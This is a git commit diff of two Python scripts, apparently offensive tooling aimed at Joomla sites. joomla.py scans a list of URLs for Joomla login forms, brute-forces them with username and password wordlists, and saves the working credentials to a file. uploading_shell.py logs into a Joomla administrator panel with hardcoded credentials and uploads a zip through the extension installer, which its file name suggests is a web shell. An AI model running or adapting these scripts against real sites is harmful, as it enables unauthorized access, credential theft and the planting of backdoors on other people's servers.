183bc540762a6cdb941bb003de4f3f652b309336
s3fg <javier.m@tutanota.com>
2017-04-09 17:10:34 +0300

    for uploader

--- joomla.py
+++ joomla.py
@@ -2,72 +2,78 @@
 import mechanize
 import sys
 
-error = ["Username and password do not match or you do not have an account yet.", "LADP","error404"]
-sussuc = "Control Panel"
-joomla = "form-login"
-br = mechanize.Browser()
-br.set_handle_robots(False)
-fopen = open("/root/scanner/t.txt", "r")
-username = open(sys.argv[1])
-passw = open(sys.argv[2])
-userlist = username.readlines()
-passlist = passw.readlines()
+if sys.argv[1] == "-h":
+    print " usage:\n \n \t joompa.py username.txt password.txt\n \n"
+else:
 
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
+    error = ["Username and password do not match or you do not have an account yet.", "LADP","error404"]
+    sussuc = "Control Panel"
+    joomla = "form-login"
+    br = mechanize.Browser()
+    br.set_handle_robots(False)
+    fopen = open("/root/scanner/t.txt", "r")
+    username = open(sys.argv[1])
+    passw = open(sys.argv[2])
+    userlist = username.readlines()
+    passlist = passw.readlines()
 
-for line in fopen.readlines():
-    logged = False
-    #print bcolors.BOLD + line.strip()
+    class bcolors:
+        HEADER = '\033[95m'
+        OKBLUE = '\033[94m'
+        OKGREEN = '\033[92m'
+        WARNING = '\033[93m'
+        FAIL = '\033[91m'
+        ENDC = '\033[0m'
+        BOLD = '\033[1m'
+        UNDERLINE = '\033[4m'
 
-    try:
-        page = br.open(line.strip(), timeout=5)
-        print bcolors.HEADER + "URL OPENED: " + bcolors.OKBLUE + line
 
-    except:
-        #print bcolors.WARNING + "Error ocurred"
-        pass
 
-    try:
-        mainpage = br.response().read()
-        if joomla in mainpage:
-            print bcolors.OKBLUE + "login found"
-            for form in br.forms():
-                for u in userlist:
-                    if logged == False:
-                        for p in passlist:
-                            try:
-                                br.select_form(nr=0)
-                                #print bcolors.UNDERLINE + "\n" + line + "trying user: %s and password: %s \n" % (u, p)
-                                br.form["username"] = u
-                                br.form["passwd"] = p
-                                br.submit()
-                                readingPage = br.response().read()
-                                if sussuc in readingPage:
-                                    logged = True
-                                    print bcolors.OKGREEN + "succefully loggen in!\n ---------------------------------"
-                                    print "Adding the Credential information to a new list file call (target.txt)......"
-                                    target = open('target.txt', 'a')
-                                    target.write('the URL address: ' + line + "\n user name: " + u + "\n and password: " + p + "\n =======================\n")
-                                    target.close()
-                                else:
-                                    #print bcolors.FAIL + "Wrong credentials\n ----------------------------------------"
-                                    continue
-                            except:
-                                pass
+    for line in fopen.readlines():
+        logged = False
+        #print bcolors.BOLD + line.strip()
 
-        else:
-            #print bcolors.UNDERLINE + "no login page found!!"
-            continue
-    except:
-        pass
-passw.close()
-username.close()
-fopen.close()
+        try:
+            page = br.open(line.strip(), timeout=5)
+            #print bcolors.HEADER + "URL OPENED: " + bcolors.OKBLUE + line
+
+        except:
+            print bcolors.WARNING + "Error ocurred"
+            pass
+
+        try:
+            mainpage = br.response().read()
+            if joomla in mainpage:
+                print bcolors.OKBLUE + "login found: " + line
+                for form in br.forms():
+                    for u in userlist:
+                        if logged == False:
+                            for p in passlist:
+                                try:
+                                    br.select_form(nr=0)
+                                    #print bcolors.UNDERLINE + "\n" + line + "trying user: %s and password: %s \n" % (u, p)
+                                    br.form["username"] = u
+                                    br.form["passwd"] = p
+                                    br.submit()
+                                    readingPage = br.response().read()
+                                    if sussuc in readingPage:
+                                        logged = True
+                                        print bcolors.OKGREEN + "succefully loggen in!\n ---------------------------------"
+                                        print "Adding the Credential information to a new list file call (target.txt)......"
+                                        target = open('target.txt', 'a')
+                                        target.write('the URL address: ' + line + "\n user name: " + u + "\n and password: " + p + "\n =======================\n")
+                                        target.close()
+                                    else:
+                                        #print bcolors.FAIL + "Wrong credentials\n ----------------------------------------"
+                                        continue
+                                except:
+                                    pass
+
+            else:
+                #print bcolors.UNDERLINE + "no login page found!!"
+                continue
+        except:
+            pass
+    passw.close()
+    username.close()
+    fopen.close()
--- uploading_shell.py
+++ uploading_shell.py
@@ -2,34 +2,29 @@
 
 from selenium import webdriver
 from bs4 import BeautifulSoup
-import mechanize
+import mechanize, requests
 import urllib2 ,urllib
 
 users_file = open("/root/PycharmProjects/untitled/project/scanner/username.txt", "r")
 password_file = open("/root/PycharmProjects/untitled/project/scanner/password.txt", "r")
 br = mechanize.Browser()
 
-br2 = br.open("http://109.123.90.187/joomlatest/administrator")
+br2 = br.open("http://192.168.60.153/joomlatest/administrator/index.php?option=com_installer")
+
+
+br.select_form(nr=0)
+br.form["username"] = "administrator"
+br.form["passwd"] = "123456"
+br.submit()
+readingPage = br.response().code
+if readingPage == 200:
+  print "login success"
+
 for form in br.forms():
-
-    br.select_form(nr=0)
-    for usr in users_file.readlines():
-        credet = str(usr)
-        for passw in password_file.readlines():
-            credet2 = str(passw)
-            br.form["username"] = credet
-            br.form["passwd"] = credet2
-            br.submit()
-        readingPage = br.response().read()
-        if readingPage == 200:
-            print "login success"
-        else: continue
-
-html = "http://109.123.90.187/joomlatest/administrator/index.php?option=com_templates&view=template&id=503&file=aG9tZQ=="
-
-openinig_templates_Beez3 = br.open(html)
-
-
-for f in br.links():
-    print f
-
+    print form
+br.select_form(nr=0)
+# br['install_url']='uploader.zip'
+# br.form["new_name"] = "this is not helpp"
+br.form.set_all_readonly(False)
+br.form.add_file(open('uploader.zip'), '', 'uploader.zip')
+br.submit()
